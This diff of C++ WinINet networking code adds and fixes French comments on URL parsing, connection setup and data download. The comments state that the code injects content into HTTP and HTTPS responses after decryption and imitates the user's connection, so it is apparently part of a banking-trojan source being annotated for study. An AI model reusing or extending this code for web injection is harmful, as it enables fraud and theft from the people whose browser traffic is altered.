@@ -42,16 +42,16 @@ void Wininet::Uninit(void)
 
 bool Wininet::_CallURL(CALLURLDATA *pcud, MEMDATA *pBuf)
 {
-  bool r = false;
+  bool r = false; //booleen si la récupération des donnés a été faite
   HttpTools::URLDATA ud;
 
-  if(HttpTools::_parseUrl(pcud->pstrURL, &ud))
+  if(HttpTools::_parseUrl(pcud->pstrURL, &ud)) //sérialise l'url en un objet URLDATA
   {
     DWORD dwRequestFlags = pcud->SendRequest_dwFlags;
-    if(ud.scheme == HttpTools::UDS_HTTPS)dwRequestFlags |= WISRF_IS_HTTPS; // serveur qui utilise https (TLS). Donc l'injection à lieu après le déchiffrement
-    else dwRequestFlags &= ~(WISRF_IS_HTTPS); // serveur qui utilise du http standard
+    if(ud.scheme == HttpTools::UDS_HTTPS)dwRequestFlags |= WISRF_IS_HTTPS; // serveur qui utilise HTTPS (TLS). Donc l'injection à lieu après le déchiffrement
+    else dwRequestFlags &= ~(WISRF_IS_HTTPS); // serveur qui utilise du HTTP standard
 
-    for(BYTE bi = 0; bi < pcud->bTryCount; bi++) //parcours de tous les octect 
+    for(BYTE bi = 0; bi < pcud->bTryCount; bi++) //parcours de tous les octects 
     {
      
       if(bi > 0)
@@ -75,16 +75,18 @@ bool Wininet::_CallURL(CALLURLDATA *pcud, MEMDATA *pBuf)
       {
         if(pp == 1)dwConnectFlags &= ~(WICF_USE_IE_PROXY);
 
-        //HINTERNET sont des HANDLE utilisés par WinINET. Initialisation de la connexion
+        //HINTERNET sont des HANDLE utilisés par WinINET. Initialisation de la connexion en imitant celle de l'utilisateur
         HINTERNET hConnect = _Connect(pcud->pstrUserAgent, ud.host, ud.port, dwConnectFlags);
         if(hConnect) // si la connexion a été correctement initialisée
         {
 
-	  //On envoit la requête HTTP (GET ou POST) 	
+	  //On lance une requête HTTP (GET ou POST) 	
           HINTERNET hRequest = _SendRequest(hConnect, ud.uri, NULL, pcud->SendRequest_pPostData, pcud->SendRequest_dwPostDataSize, dwRequestFlags);
-          if(hRequest)
+          if(hRequest) //si la requête a été faite
           {
-            if(pcud->DownloadData_pstrFileName)r = _DownloadDataToFile(hRequest, pcud->DownloadData_pstrFileName, pcud->DownloadData_dwSizeLimit, pcud->hStopEvent);
+ 	    //Récupération des données dans une fichier
+            if(pcud->DownloadData_pstrFileName) r = _DownloadDataToFile(hRequest, pcud->DownloadData_pstrFileName, pcud->DownloadData_dwSizeLimit, pcud->hStopEvent);
+	    //Récupération des données dans le tampon pBuf. Des données pourront être ajoutées à celles récupérées, pour faire une injection web
             else r = _DownloadData(hRequest, pBuf, pcud->DownloadData_dwSizeLimit, pcud->hStopEvent);
             CWA(wininet, InternetCloseHandle)(hRequest);
           }
@@ -97,7 +99,7 @@ bool Wininet::_CallURL(CALLURLDATA *pcud, MEMDATA *pBuf)
 END:
     HttpTools::_freeUrlData(&ud);
   }
-  return r;
+  return r; //booleen si la récupération des donnés a été faite
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -171,7 +173,7 @@ HINTERNET Wininet::_SendRequest(HINTERNET hConnect, LPSTR pstrURI, LPSTR pstrRef
     }
     CWA(wininet, InternetCloseHandle)(hReq);
   }
-  return NULL; //échech de la requête
+  return NULL; //échec de la requête
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
